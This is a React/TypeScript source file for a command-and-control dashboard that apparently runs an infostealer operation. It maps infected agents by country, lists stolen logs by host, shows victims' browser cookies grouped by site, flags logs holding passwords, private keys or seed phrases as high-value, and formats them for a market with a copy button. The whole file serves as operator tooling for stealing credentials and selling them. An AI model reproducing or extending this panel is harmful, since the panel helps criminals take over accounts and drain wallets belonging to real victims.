                    icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.206" /></svg>}
                />
                <OverviewStatCard 
                    title="Total Logs" 
                    value={totalLogs.toString()}
                    subValue={`${importantLogs} important`}
                    color="text-blue-400"
                    icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg>}
                />
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                <div className="lg:col-span-2 bg-gray-800/50 rounded-lg p-6 border border-gray-700/50">
                    <h3 className="text-xl font-bold mb-4">Last 30 Days</h3>
                    <ResponsiveContainer width="100%" height={350}>
                        <AreaChart data={logStatsByDay}>
                            <defs>
                                <linearGradient id="colorImportant" x1="0" y1="0" x2="0" y2="1">
                                    <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.8}/>
                                    <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
                                </linearGradient>
                                <linearGradient id="colorRegular" x1="0" y1="0" x2="0" y2="1">
                                    <stop offset="5%" stopColor="#14b8a6" stopOpacity={0.8}/>
                                    <stop offset="95%" stopColor="#14b8a6" stopOpacity={0}/>
                                </linearGradient>
                            </defs>
                            <CartesianGrid strokeDasharray="3 3" stroke="rgba(255, 255, 255, 0.1)" />
                            <XAxis dataKey="date" stroke="#8892b0" fontSize={12} />
                            <YAxis stroke="#8892b0" fontSize={12} />
                            <Tooltip contentStyle={{ backgroundColor: '#1a202c', border: '1px solid #4a5568' }}/>
                            <Legend />
                            <Area type="monotone" dataKey="important" name="Important Logs" stroke="#3b82f6" fillOpacity={1} fill="url(#colorImportant)" />
                            <Area type="monotone" dataKey="regular" name="Regular Logs" stroke="#14b8a6" fillOpacity={1} fill="url(#colorRegular)" />
                        </AreaChart>
                    </ResponsiveContainer>
                </div>

                <div className="space-y-8">
                    <div className="bg-gray-800/50 rounded-lg p-6 border border-gray-700/50">
                        <h3 className="text-xl font-bold mb-4">Total Logs ({totalLogs})</h3>
                        <ResponsiveContainer width="100%" height={200}>
                            <PieChart>
                                <Pie 
                                    data={totalLogsData} 
                                    dataKey="value" 
                                    nameKey="name" 
                                    cx="50%" 
                                    cy="50%" 
                                    innerRadius={60} 
                                    outerRadius={80} 
                                    fill="#8884d8" 
                                    paddingAngle={5}
                                >
                                    {totalLogsData.map((entry, index) => (
                                        <Cell key={`cell-${index}`} fill={entry.color} />
                                    ))}
                                </Pie>
                                <Tooltip contentStyle={{ backgroundColor: '#1a202c', border: '1px solid #4a5568' }}/>
                                <Legend />
                            </PieChart>
                        </ResponsiveContainer>
                    </div>
                    <div className="bg-gray-800/50 rounded-lg p-6 border border-gray-700/50">
                        <h3 className="text-xl font-bold mb-4">Agents by Country</h3>
                        <AgentsWorldMap agents={agents} />
                    </div>
                </div>
            </div>
        </div>
    );
}

const AgentsWorldMap: React.FC<{ agents: Agent[] }> = ({ agents }) => {
    const agentCounts = useMemo(() => {
        const counts: { [key: string]: { markerOffset: number; "count": number, "coords": [number, number]} } = {};
        
        // This is a simplified lookup. A real implementation might use a library or API.
        const countryCoords: { [key: string]: [number, number] } = {
            US: [-95, 38], CA: [-105, 55], DE: [10, 51], GB: [-2, 54], FR: [2, 46],
            // Add more countries as needed
        };

        agents.forEach(agent => {
            const countryCode = agent.country_code || 'XX';
            if (!counts[countryCode]) {
                 counts[countryCode] = {
                    markerOffset: -15,
                    count: 0,
                    coords: countryCoords[countryCode] || [0,0],
                };
            }
            counts[countryCode].count++;
        });

        return Object.entries(counts).map(([country, data]) => ({
            name: country,
            ...data
        }));
    }, [agents]);

    if (!agents || agents.length === 0) {
        return <p className="text-csfloat-light/70">No agent data to display on map.</p>;
    }

    return (
        <ComposableMap projectionConfig={{ scale: 100 }} style={{ width: "100%", height: "auto" }}>
            <Geographies geography={geoUrl}>
                {({ geographies }: { geographies: any[] }) =>
                    geographies.map((geo: any) => (
                        <Geography
                            key={geo.rsmKey}
                            geography={geo}
                            fill="#334155"
                            stroke="#1e293b"
                        />
                    ))
                }
            </Geographies>
            {agentCounts.map(({ name, coords, count }) => (
                <Marker key={name} coordinates={coords}>
                    <circle r={4 + count * 0.5} fill="#3b82f6" stroke="#fff" strokeWidth={1} />
                    <text
                        textAnchor="middle"
                        y={-15}
                        style={{ fontFamily: "system-ui", fill: "#fff", fontSize: 10 }}
                    >
                        {name} ({count})
                    </text>
                </Marker>
            ))}
        </ComposableMap>
    );
};

const StatCard: React.FC<{title: string, value: number | string, color?: string}> = ({ title, value, color = 'text-white' }) => (
    <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
        <h3 className="text-csfloat-light/70 text-sm mb-2">{title}</h3>
        <p className={`text-3xl font-bold ${color}`}>{value}</p>
    </div>
);

const LogsTab: React.FC<{logs: Log[], onSelectLog: (log: Log) => void, onDeleteLog: (id: number) => void, getLogTypeColor: (type: string) => string}> = ({ logs, onSelectLog, onDeleteLog, getLogTypeColor }) => {
    return (
        <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20 overflow-hidden">
            <table className="min-w-full divide-y divide-csfloat-gray/20">
                <thead className="bg-csfloat-dark">
                    <tr>
                        <th className="px-6 py-3 text-left text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Agent</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Log Type</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Time</th>
                        <th className="px-6 py-3 text-right text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Actions</th>
                    </tr>
                </thead>
                <tbody className="divide-y divide-csfloat-gray/20">
                    {logs.map(log => (
                        <tr key={log.id} className="hover:bg-csfloat-gray/10 transition-colors">
                            <td className="px-6 py-4 whitespace-nowrap">
                                <div className="text-sm font-medium">{log.hostname}</div>
                                <div className="text-xs text-csfloat-light/70 font-mono">{log.agent_id}</div>
                            </td>
                             <td className="px-6 py-4 whitespace-nowrap">
                                <span className={`inline-block px-2 py-0.5 rounded text-xs font-semibold ${getLogTypeColor(log.log_type)}`}>
                                    {log.log_type}
                                </span>
                            </td>
                            <td className="px-6 py-4 whitespace-nowrap text-sm text-csfloat-light/70">{new Date(log.created_at).toLocaleString()}</td>
                            <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                                <button onClick={() => onSelectLog(log)} className="text-csfloat-blue hover:text-blue-400 mr-4">View</button>
                                <button onClick={() => onDeleteLog(log.id)} className="text-red-500 hover:text-red-400">Delete</button>
                            </td>
                        </tr>
                    ))}
                </tbody>
            </table>
        </div>
    );
}

const LogViewer: React.FC<{log: Log}> = ({ log }) => {
    // --- Cookie Sorting/Filtering UI for 'browsers' logs ---
    const [selectedSite, setSelectedSite] = React.useState<string>('');
    const [sortKey, setSortKey] = React.useState<'name' | 'value'>('name');
    const [sortAsc, setSortAsc] = React.useState<boolean>(true);
    const [showRaw, setShowRaw] = React.useState<boolean>(false);
    const [copied, setCopied] = React.useState<boolean>(false);

    const isValuable = hasValuableData(log);
    const formattedData = isValuable ? formatLogForMarket(log) : '';

    const handleCopy = () => {
        navigator.clipboard.writeText(formattedData);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    // Helper to extract all cookies grouped by domain/site
    const getCookiesBySite = (data: any) => {
        const cookies: any[] = [];
        // Chromium browsers
        Object.values(data.chromium || {}).forEach((browser: any) => {
            if (Array.isArray(browser.cookies)) {
                cookies.push(...browser.cookies);
            }
        });
        // Gecko browsers
        Object.values(data.gecko || {}).forEach((browser: any) => {
            if (Array.isArray(browser.cookies)) {
                cookies.push(...browser.cookies);
            }
        });
        // Group by domain
        const grouped: Record<string, any[]> = {};
        cookies.forEach(cookie => {
            const domain = cookie.domain || 'unknown';
            if (!grouped[domain]) grouped[domain] = [];
            grouped[domain].push(cookie);
        });
        return grouped;
    };

    // Only show cookie UI for browsers logs
    if (log.log_type === 'browsers') {
        const cookiesBySite = getCookiesBySite(log.data);
        const allSites = Object.keys(cookiesBySite).sort();
        const site = selectedSite && cookiesBySite[selectedSite] ? selectedSite : allSites[0] || '';
        const cookies = cookiesBySite[site] || [];
        const sortedCookies = [...cookies].sort((a, b) => {
            if (a[sortKey] < b[sortKey]) return sortAsc ? -1 : 1;
            if (a[sortKey] > b[sortKey]) return sortAsc ? 1 : -1;
            return 0;
        });
        return (
            <div className="bg-csfloat-darker rounded p-4 border border-csfloat-gray/10">
                <div className="mb-4 flex flex-wrap gap-4 items-center">
                    <label className="text-csfloat-light/80 font-medium">Site:</label>
                    <select
                        value={site}
                        onChange={e => setSelectedSite(e.target.value)}
                        className="bg-csfloat-dark border border-csfloat-gray/20 rounded px-2 py-1 text-white"
                    >
                        {allSites.map(domain => (
                            <option key={domain} value={domain}>{domain}</option>
                        ))}
                    </select>
                    <label className="ml-4 text-csfloat-light/80 font-medium">Sort by:</label>
                    <select
                        value={sortKey}
                        onChange={e => setSortKey(e.target.value as 'name' | 'value')}
                        className="bg-csfloat-dark border border-csfloat-gray/20 rounded px-2 py-1 text-white"
                    >
                        <option value="name">Name</option>
                        <option value="value">Value</option>
                    </select>
                    <button
                        className="ml-2 px-2 py-1 rounded border border-csfloat-gray/20 text-white bg-csfloat-blue hover:bg-blue-600"
                        onClick={() => setSortAsc(a => !a)}
                    >
                        {sortAsc ? 'Asc' : 'Desc'}
                    </button>
                </div>
                <div className="overflow-x-auto">
                    <table className="min-w-full text-sm">
                        <thead>
                            <tr className="bg-csfloat-dark/80">
                                <th className="px-2 py-1 text-left">Name</th>
                                <th className="px-2 py-1 text-left">Value</th>
                                <th className="px-2 py-1 text-left">Domain</th>
                                <th className="px-2 py-1 text-left">Path</th>
                                <th className="px-2 py-1 text-left">Expires</th>
                                <th className="px-2 py-1 text-left">HttpOnly</th>
                                <th className="px-2 py-1 text-left">Secure</th>
                            </tr>
                        </thead>
                        <tbody>
                            {sortedCookies.map((cookie, idx) => (
                                <tr key={idx} className="border-b border-csfloat-gray/10">
                                    <td className="px-2 py-1 font-mono text-csfloat-blue break-all">{cookie.name}</td>
                                    <td className="px-2 py-1 font-mono text-csfloat-light/90 break-all">{cookie.value}</td>
                                    <td className="px-2 py-1 font-mono">{cookie.domain}</td>
                                    <td className="px-2 py-1 font-mono">{cookie.path}</td>
                                    <td className="px-2 py-1 font-mono">{cookie.expires || ''}</td>
                                    <td className="px-2 py-1 font-mono">{cookie.http_only ? 'Yes' : 'No'}</td>
                                    <td className="px-2 py-1 font-mono">{cookie.secure ? 'Yes' : 'No'}</td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                    {sortedCookies.length === 0 && <div className="text-csfloat-light/70 py-4">No cookies for this site.</div>}
                </div>
            </div>
        );
    }

    return (
        <div>
            <div className="flex justify-between items-center mb-4">
                <div className="flex items-center space-x-4">
                    <button
                        onClick={() => setShowRaw(!showRaw)}
                        className="px-3 py-1 text-sm rounded bg-gray-600 hover:bg-gray-500 transition-colors"
                    >
                        {showRaw ? 'Show Formatted' : 'Show Raw JSON'}
                    </button>
                    {isValuable && !showRaw && (
                         <button
                            onClick={handleCopy}
                            className="px-3 py-1 text-sm rounded bg-blue-600 hover:bg-blue-500 transition-colors"
                        >
                            {copied ? 'Copied!' : 'Copy Log'}
                        </button>
                    )}
                </div>
            </div>

            {!isValuable && !showRaw &&(
                <div className="bg-yellow-900/50 border border-yellow-700 text-yellow-300 rounded p-4 text-center">
                    <p className="font-bold">No High-Value Information Detected</p>
                    <p className="text-sm">This log does not appear to contain sensitive credentials like passwords, private keys, or seed phrases. You can view the full raw data.</p>
                </div>
            )}

             <div className="mt-4 bg-csfloat-darker rounded p-4 border border-csfloat-gray/10 max-h-[60vh] overflow-y-auto">
                <pre className="text-white text-sm whitespace-pre-wrap">
                    {showRaw ? JSON.stringify(log.data, null, 2) : (isValuable ? formattedData : JSON.stringify(log.data, null, 2))}
                </pre>
            </div>
        </div>
    );
};

export default C2Dashboard; 